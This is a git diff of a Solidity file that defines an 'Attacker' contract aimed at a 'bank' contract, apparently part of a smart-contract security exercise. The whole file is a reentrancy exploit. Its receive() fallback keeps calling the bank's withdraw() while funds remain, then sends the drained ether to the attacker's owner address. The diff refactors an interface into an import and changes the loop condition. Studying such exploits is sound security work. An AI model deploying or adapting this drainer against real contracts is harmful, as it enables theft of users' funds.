@@ -1,17 +1,14 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IBank{
-    function deposit() external payable; 
-    function withdraw() external;
-}
+import "../src/bank.sol";
 
-contract attack{
-      IBank public immutable mybank;
+contract Attacker {
+      bank public immutable mybank;
       address public owner;
 
-      constructor (address bankaddress){
-          mybank = IBank(bankaddress);
+      constructor (address payable bankaddress){
+          mybank = bank(bankaddress);
           owner = msg.sender;
       }
 
@@ -22,7 +19,7 @@ contract attack{
       }
     
       receive() external payable {
-          if(address(mybank).balance > 0)
+          if(address(mybank).balance >= mybank.getBalance())
               mybank.withdraw();
           else
               payable(owner).transfer(address(this).balance);          
